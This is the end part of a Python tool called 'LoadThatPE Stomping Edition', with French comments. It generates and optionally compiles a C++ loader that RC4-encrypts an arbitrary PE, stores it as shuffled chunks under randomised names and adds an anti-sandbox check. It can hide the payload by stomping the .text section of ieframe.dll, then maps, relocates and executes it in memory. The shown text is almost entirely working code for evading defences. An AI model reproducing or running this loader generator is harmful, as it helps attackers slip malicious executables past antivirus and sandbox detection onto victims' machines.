        code += f'    printf("Etape 4 : resolution des imports\\n");\n'
    code += f"    IMAGE_NT_HEADERS* {vn['nt']} = (IMAGE_NT_HEADERS*)(\n"
    code += f"        {vn['mapped']} + ((IMAGE_DOS_HEADER*){vn['mapped']})->e_lfanew);\n"
    code += f"    if (!{vn['imports_func']}({vn['mapped']}, {vn['nt']})) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 5 : relocation\\n");\n'
    code += f"    {vn['reloc_func']}({vn['mapped']}, {vn['nt']});\n\n"

    if verbose:
        code += f'    printf("Etape 6 : permissions par section\\n");\n'
    code += f"    {vn['protect_func']}({vn['mapped']}, {vn['nt']});\n\n"

    if verbose:
        code += f'    printf("Etape 7 : execution\\n");\n'
    code += f"    {vn['exec_func']}({vn['mapped']});\n\n"

    code += "    return 0;\n"
    code += "}\n"

    if output_file:
        with open(output_file, 'w') as f:
            f.write(code)
        print(f"[+] Fichier C++ genere : {output_file}")
    else:
        print(code)


# =============================================================================
# generate_section_stomping_loader
# =============================================================================

def generate_section_stomping_loader(input_file: str, output_file: str = None, verbose: bool = False):
    rc4_key = generate_rc4_key()
    vn = make_vn()
    pe_size, chunks, original_order, shuffled_order = prepare_chunks(input_file, rc4_key)

    code  = gen_includes()
    code += f"static const SIZE_T {vn['pe_size']} = {pe_size}ULL;\n\n"
    code += gen_rc4_key_globals(vn, rc4_key)

    print("[+] Emission des chunks...")
    code += gen_chunks(chunks, shuffled_order)

    code += gen_reconstruct_func(vn, chunks, original_order, verbose)
    code += gen_decrypt_func(vn, verbose)
    code += gen_stomp_func(vn, verbose)
    code += gen_map_func(vn, verbose)
    code += gen_imports_func(vn, verbose)
    code += gen_reloc_func(vn, verbose)
    code += gen_protect_func(vn, verbose)
    code += gen_exec_func(vn, verbose)

    # main
    code += "int main(void) {\n"
    code += gen_antisandbox(vn)

    if verbose:
        code += f'    printf("Etape 1 : reconstruction du blob chiffre en memoire temporaire\\n");\n'
    code += f"    unsigned char* blob = {vn['reconstruct_func']}();\n"
    code += f"    if (!blob) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 2 : stomping dans une dll (copie du blob chiffre)\\n");\n'
    code += f"    unsigned char* stomped = {vn['stomp_func']}(blob, (int){vn['pe_size']});\n"
    code += f"    VirtualFree(blob, 0, MEM_RELEASE);\n"
    code += f"    if (!stomped) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 3 : dechiffrement RC4 in-place dans la section stompee\\n");\n'
    code += f"    DWORD _rc4_old;\n"
    code += f"    VirtualProtect(stomped, {vn['pe_size']}, PAGE_READWRITE, &_rc4_old);\n"
    code += f"    {vn['decrypt_func']}(stomped, {vn['pe_size']});\n"
    code += f"    VirtualProtect(stomped, {vn['pe_size']}, PAGE_EXECUTE_READ, &_rc4_old);\n\n"

    if verbose:
        code += f'    printf("Etape 4 : mapping PE propre depuis la zone stompee\\n");\n'
    code += f"    unsigned char* {vn['mapped']} = {vn['map_func']}(stomped);\n"
    code += f"    if (!{vn['mapped']}) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 5 : resolution des imports\\n");\n'
    code += f"    IMAGE_NT_HEADERS* {vn['nt']} = (IMAGE_NT_HEADERS*)(\n"
    code += f"        {vn['mapped']} + ((IMAGE_DOS_HEADER*){vn['mapped']})->e_lfanew);\n"
    code += f"    if (!{vn['imports_func']}({vn['mapped']}, {vn['nt']})) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 6 : relocation\\n");\n'
    code += f"    {vn['reloc_func']}({vn['mapped']}, {vn['nt']});\n\n"

    if verbose:
        code += f'    printf("Etape 7 : permissions par section\\n");\n'
    code += f"    {vn['protect_func']}({vn['mapped']}, {vn['nt']});\n\n"

    if verbose:
        code += f'    printf("Etape 8 : execution\\n");\n'
    code += f"    {vn['exec_func']}({vn['mapped']});\n\n"

    code += "    return 0;\n"
    code += "}\n"

    if output_file:
        with open(output_file, 'w') as f:
            f.write(code)
        print(f"[+] Fichier C++ genere : {output_file}")
    else:
        print(code)


# =============================================================================
# main
# =============================================================================

if __name__ == "__main__":
    print("*******************************************")
    print("************** LoadThatPE *****************")
    print("*********** Stomping Edition **************")
    print("*******************************************\n")

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Genere un loader PE chiffre RC4 avec mapping discret."
    )
    parser.add_argument('input_path', help='Chemin vers le PE a charger')
    parser.add_argument('-c', action='store_true', help='Compiler le .cpp genere')
    parser.add_argument('--stomp', action='store_true', help='Utiliser le section stomping sur ieframe.dll')
    parser.add_argument('-v', action='store_true', help='Activer les printf verbeux dans le binaire genere')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if not os.path.exists(options.input_path):
        print(f"[-] Fichier introuvable : {options.input_path}")
        sys.exit(1)

    cpp_path = "loader_pe.cpp"
    exe_path = "loader_pe.exe"

    if options.stomp:
        print("[+] Mode : section stomping (ieframe.dll / .text)")
        generate_section_stomping_loader(options.input_path, cpp_path, verbose=options.v)
    else:
        print("[+] Mode : loader classique (VirtualAlloc)")
        generate_loader(options.input_path, cpp_path, verbose=options.v)

    if options.c:
        ok = compile_cpp(cpp_path, exe_path)
        if not ok:
            sys.exit(1)
    else:
        print(f"[+] Compilation ignoree (pas de -c). Fichier : {cpp_path}")
